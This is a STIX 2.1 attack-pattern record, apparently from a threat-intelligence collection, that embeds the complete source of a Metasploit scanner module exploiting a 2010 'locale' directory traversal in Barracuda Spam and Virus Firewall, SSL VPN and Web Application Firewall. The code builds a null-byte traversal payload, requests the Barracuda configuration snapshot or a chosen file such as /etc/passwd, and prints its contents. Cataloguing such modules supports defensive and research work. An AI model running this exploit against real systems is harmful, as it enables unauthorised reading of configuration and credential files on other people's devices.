{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--adacca5b-fb1a-4bd3-9ed8-70ac6823cf15",
    "created": "2024-08-14T16:29:59.289971Z",
    "modified": "2024-08-14T16:29:59.289975Z",
    "name": "Barracuda Multiple Product \"locale\" Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability present in several Barracuda products, including the Barracuda Spam and Virus Firewall Barracuda SSL VPN, and the Barracuda Web Application Firewall. By default this module will attempt to download the Barracuda configuration file.  'References'     => [ ['OSVDB', '68301']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/barracuda_directory_traversal.rb",
            "external_id": "barracuda_directory_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Barracuda Multiple Product \"locale\" Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability present in\n        several Barracuda products, including the Barracuda Spam and Virus Firewall,\n        Barracuda SSL VPN, and the Barracuda Web Application Firewall. By default,\n        this module will attempt to download the Barracuda configuration file.\n      },\n      'References'     =>\n        [\n          ['OSVDB', '68301'],\n          ['URL', 'https://web.archive.org/web/20101004131244/http://secunia.com/advisories/41609/'],\n          ['EDB', '15130']\n        ],\n      'Author'         =>\n        [\n          'Tiago Ferreira <tiago.ccna[at]gmail.com>'\n        ],\n      'DisclosureDate' => 'Oct 08 2010',\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('FILE', [ true,  \"Define the remote file to view, ex:/etc/passwd\", '/mail/snapshot/config.snapshot']),\n        OptString.new('TARGETURI', [true, 'Barracuda vulnerable URI path', '/cgi-mod/view_help.cgi']),\n      ])\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(target_uri.path)\n    file = datastore['FILE']\n    payload = \"?locale=/../../../../../../..#{file}%00\"\n\n    print_status(\"#{full_uri} - Barracuda - Checking if remote server is vulnerable\")\n\n    res = send_request_raw(\n      {\n        'method'  => 'GET',\n        'uri'     => uri + payload,\n      }, 25)\n\n    if res.nil?\n      print_error(\"#{full_uri} - Connection timed out\")\n      return\n    end\n\n    if (res.code == 200 and res.body)\n      if res.body.match(/\\<html\\>(.*)\\<\\/html\\>/im)\n        html = $1\n\n        if res.body =~ /barracuda\\.css/\n          if html.length > 100\n            file_data = html.gsub(%r{</?[^>]+?>}, '')\n\n            print_good(\"#{full_uri} - Barracuda - Vulnerable\")\n            print_good(\"#{full_uri} - Barracuda - File Output:\\n\" + file_data + \"\\n\")\n          else\n            print_error(\"#{full_uri} - Barracuda - Not vulnerable: HTML too short?\")\n          end\n        elsif res.body =~ /help_page/\n          print_error(\"#{full_uri} - Barracuda - Not vulnerable: Patched?\")\n        else\n          print_error(\"#{full_uri} - Barracuda - File not found or permission denied\")\n        end\n      else\n        print_error(\"#{full_uri} - Barracuda - No HTML was returned\")\n      end\n    else\n      print_error(\"#{full_uri} - Barracuda - Unrecognized #{res.code} response\")\n    end\n\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n  rescue ::Timeout::Error, ::Errno::EPIPE\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "Oct 08 2010"
}